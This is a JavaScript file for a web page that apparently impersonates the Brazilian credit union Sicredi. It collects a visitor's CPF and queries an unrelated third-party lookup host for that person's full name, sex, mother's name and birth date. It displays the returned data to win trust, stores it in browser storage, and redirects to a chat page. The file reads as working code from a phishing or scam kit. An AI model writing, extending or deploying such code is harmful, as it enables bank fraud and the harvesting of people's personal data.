document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");
  const dataNascimento = document.getElementById("dataNascimento"); // opcional

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = (input.value || "").replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }

    input.value = value;
  }

  // ✅ Validar CPF (COM DÍGITOS VERIFICADORES)
  function validarCPF(cpf) {
    cpf = (cpf || "").replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

    let soma = 0,
      resto;
    for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf[9])) return false;

    soma = 0;
    for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;

    return resto === parseInt(cpf[10]);
  }

  // Formatação de data (YYYYMMDD para DD/MM/YYYY ou deixa como está se já estiver formatada)
  function formatDate(dateString) {
    if (!dateString) return "Não informado";
    if (String(dateString).includes("/")) return String(dateString);
    if (String(dateString).length === 8) {
      return String(dateString).replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }
    return String(dateString);
  }

  // ✅ Consulta CPF com timeout (API FEDERAL-LEILAO)
  async function consultarCpfComTimeout(cpf, timeoutMs = 1200) {
    const url = `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(
      cpf
    )}`;

    const fetchPromise = fetch(url, {
      method: "GET",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
      },
    })
      .then((response) => {
        if (!response.ok) return null;
        return response.json();
      })
      .catch(() => null);

    const timeoutPromise = new Promise((resolve) => {
      setTimeout(() => resolve(null), timeoutMs);
    });

    return Promise.race([fetchPromise, timeoutPromise]);
  }

  // ==========================
  // CONSULTA CPF (API NOVA)
  // ==========================
  async function consultarCPF(cpf) {
    const cpfLimpo = (cpf || "").replace(/\D/g, "");

    // UI: mostrar área e loading
    if (consultaResultado) consultaResultado.classList.remove("hidden");
    if (loadingInfo) loadingInfo.classList.remove("hidden");
    if (userInfo) userInfo.classList.add("hidden");
    if (errorInfo) errorInfo.classList.add("hidden");

    if (consultaResultado) {
      consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
    }

    // Defaults
    let nomeCompleto = "Cliente Sicredi";
    let primeiroNome = "Cliente";
    let nascimento = "";
    let sexo = "";
    let mae = "";

    try {
      const data = await consultarCpfComTimeout(cpfLimpo, 1200);

      if (data && data.status === 200) {
        nomeCompleto = data.nome || nomeCompleto;
        primeiroNome = (nomeCompleto.split(" ")[0] || primeiroNome).trim();
        nascimento = data.nascimento || "";
        sexo = data.sexo || "";
        mae = data.mae || "";
        console.log("📩 Retorno da API dentro do tempo:", data);
      } else {
        console.log("⏱️ API demorou demais ou falhou, seguindo com dados padrão.");
      }

      // UI: esconder loading
      if (loadingInfo) loadingInfo.classList.add("hidden");

      // Preencher tela
      if (nomeUsuario) nomeUsuario.textContent = nomeCompleto || "Não informado";

      if (cpfUsuario) {
        cpfUsuario.textContent = cpfLimpo
          ? cpfLimpo.replace(
              /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
              "$1.$2.$3-$4"
            )
          : "Não informado";
      }

      if (sexoUsuario) sexoUsuario.textContent = sexo || "Não informado";
      if (nomeMae) nomeMae.textContent = mae || "Não informado";
      if (dataNascimento) dataNascimento.textContent = formatDate(nascimento);

      // ✅ localStorage (compatível com seu /chat)
      const dadosUsuario = {
        nome: nomeCompleto || "",
        cpf: cpfLimpo || "",
        sexo: sexo || "",
        nomeMae: mae || "",
        dataNascimento: nascimento || "",
      };

      localStorage.setItem("cpf", cpfLimpo);
      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
      if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
      if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);

      // ✅ sessionStorage (padrão que você pediu guardar)
      sessionStorage.setItem("cpf", cpfLimpo);
      sessionStorage.setItem("primeiroNome", primeiroNome);
      sessionStorage.setItem("nomeCompleto", nomeCompleto);
      sessionStorage.setItem("dataNascimento", nascimento || "");
      sessionStorage.setItem("sexo", sexo || "");
      sessionStorage.setItem("nomeMae", mae || "");
      sessionStorage.setItem(
        "dadosAdicionais",
        JSON.stringify({
          cpf: cpfLimpo,
          primeiroNome,
          nomeCompleto,
          nascimento,
          sexo,
          nomeMae: mae,
        })
      );

      // Mostrar bloco de confirmação
      if (userInfo) userInfo.classList.remove("hidden");
      setTimeout(() => {
        if (userInfo) userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 150);
    } catch (err) {
      if (loadingInfo) loadingInfo.classList.add("hidden");
      if (errorMessage) {
        errorMessage.textContent =
          (err && err.message) ? err.message : "Ocorreu um erro ao consultar seus dados.";
      }
      if (errorInfo) errorInfo.classList.remove("hidden");
      console.error("Erro na consulta:", err);
      if (errorInfo) errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  }

  // Verificar se existe CPF na URL e salvar no localStorage
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has("cpf")) {
    const cpfFromUrl = (urlParams.get("cpf") || "").replace(/\D/g, "");
    if (cpfFromUrl && cpfFromUrl.length === 11) {
      localStorage.setItem("cpf", cpfFromUrl);
      console.log("CPF da URL salvo no localStorage:", cpfFromUrl);
    }
  }

  // Mostrar página de CPF
  function showCPFPage() {
    if (!mainPage || !cpfPage) return;

    mainPage.classList.add("fade-out");

    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");

      void cpfPage.offsetWidth;

      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");

      if (cpfInputPage) cpfInputPage.focus();
    }, 400);
  }

  // Voltar para a página principal
  function showMainPage() {
    if (!mainPage || !cpfPage) return;

    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");

    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");

      void mainPage.offsetWidth;

      mainPage.classList.remove("fade-out");
    }, 400);
  }

  // Processar o formulário de CPF
  function processForm() {
    const cpf = (cpfInputPage?.value || "").replace(/\D/g, "");

    if (!validarCPF(cpf)) {
      alert("Por favor, digite um CPF válido.");
      return;
    }

    if (termsCheck && !termsCheck.checked) {
      alert("Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar.");
      return;
    }

    localStorage.setItem("cpf", cpf);
    console.log("CPF salvo no localStorage:", cpf);

    consultarCPF(cpf);
  }

  // Redirecionar para o chat após confirmar os dados
  function redirecionarParaChat() {
    const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
    if (!dadosUsuarioJSON) {
      alert("Dados do usuário não encontrados. Por favor, tente novamente.");
      return;
    }

    try {
      const dadosUsuario = JSON.parse(dadosUsuarioJSON);
      if (!dadosUsuario.cpf) {
        alert("CPF não encontrado. Por favor, tente novamente.");
        return;
      }

      const cpf = String(dadosUsuario.cpf).replace(/\D/g, "");

      const urlAtual = new URLSearchParams(window.location.search);
      const novaUrl = new URLSearchParams();

      for (const [chave, valor] of urlAtual.entries()) {
        novaUrl.append(chave, valor);
      }

      novaUrl.set("cpf", cpf);

      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
    } catch (error) {
      console.error("Erro ao processar dados para redirecionamento:", error);
      alert("Ocorreu um erro ao processar seus dados. Por favor, tente novamente.");
    }
  }

  // Limpar informações e voltar para digitar CPF
  function corrigirDados() {
    if (consultaResultado) consultaResultado.classList.add("hidden");
    if (cpfInputPage) cpfInputPage.focus();
  }

  // Tentar novamente após erro
  function tentarNovamente() {
    if (consultaResultado) consultaResultado.classList.add("hidden");
    if (cpfInputPage) cpfInputPage.focus();
  }

  // Event Listeners
  if (btnAtivar) btnAtivar.addEventListener("click", showCPFPage);
  if (btnSimular) btnSimular.addEventListener("click", showCPFPage);
  if (btnVoltar) btnVoltar.addEventListener("click", showMainPage);

  if (btnAnalisar) {
    btnAnalisar.addEventListener("click", function () {
      console.log("Botão Analisar clicado");
      console.log("Valor do CPF antes do processamento:", cpfInputPage?.value);
      processForm();
    });
  }

  if (btnConfirmar) btnConfirmar.addEventListener("click", redirecionarParaChat);
  if (btnCorrigir) btnCorrigir.addEventListener("click", corrigirDados);
  if (btnTentarNovamente) btnTentarNovamente.addEventListener("click", tentarNovamente);

  // Formatação de CPF enquanto digita
  if (cpfInputPage) {
    cpfInputPage.addEventListener("input", function () {
      formatCPF(this);
    });
  }

  // ======================
  // Carrossel (igual antes)
  // ======================
  const carousel = document.getElementById("carousel");
  const slides = document.querySelectorAll(".carousel-item");
  const indicators = document.querySelectorAll(".carousel-indicator");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");

  const stepNumbers = document.querySelectorAll(".step-number");
  const stepLines = document.querySelectorAll(".step-line");

  let currentSlide = 0;
  let autoSlideInterval;

  function showSlide(index) {
    if (!slides || slides.length === 0) return;

    if (index < 0) index = slides.length - 1;
    else if (index >= slides.length) index = 0;

    slides.forEach((slide) => slide.classList.remove("active"));
    slides[index].classList.add("active");

    indicators.forEach((indicator, i) => {
      if (i === index) indicator.classList.add("active");
      else indicator.classList.remove("active");
    });

    updateSteps(index);
    currentSlide = index;
  }

  function updateSteps(index) {
    stepNumbers.forEach((step, i) => {
      step.classList.remove("active", "completed");
      if (i === index) step.classList.add("active");
      else if (i < index) step.classList.add("completed");
    });

    stepLines.forEach((line, i) => {
      if (i < index) line.classList.add("active");
      else line.classList.remove("active");
    });
  }

  function nextSlide() {
    showSlide(currentSlide + 1);
    resetAutoSlide();
  }

  function prevSlide() {
    showSlide(currentSlide - 1);
    resetAutoSlide();
  }

  function startAutoSlide() {
    autoSlideInterval = setInterval(nextSlide, 5000);
  }

  function resetAutoSlide() {
    clearInterval(autoSlideInterval);
    startAutoSlide();
  }

  if (prevBtn && nextBtn && carousel && slides.length) {
    nextBtn.addEventListener("click", nextSlide);
    prevBtn.addEventListener("click", prevSlide);

    indicators.forEach((indicator, index) => {
      indicator.addEventListener("click", () => {
        showSlide(index);
        resetAutoSlide();
      });
    });

    stepNumbers.forEach((step) => {
      step.addEventListener("click", () => {
        const stepIndex = parseInt(step.getAttribute("data-step"), 10);
        if (!Number.isNaN(stepIndex)) {
          showSlide(stepIndex);
          resetAutoSlide();
        }
      });
    });

    let touchStartX = 0;

    carousel.addEventListener(
      "touchstart",
      (e) => {
        touchStartX = e.changedTouches[0].screenX;
      },
      { passive: true }
    );

    carousel.addEventListener(
      "touchend",
      (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const diff = touchEndX - touchStartX;

        if (diff > 50) prevSlide();
        else if (diff < -50) nextSlide();
      },
      { passive: true }
    );

    carousel.addEventListener("mouseenter", () => clearInterval(autoSlideInterval));
    carousel.addEventListener("mouseleave", startAutoSlide);

    showSlide(0);
    startAutoSlide();
  }
});
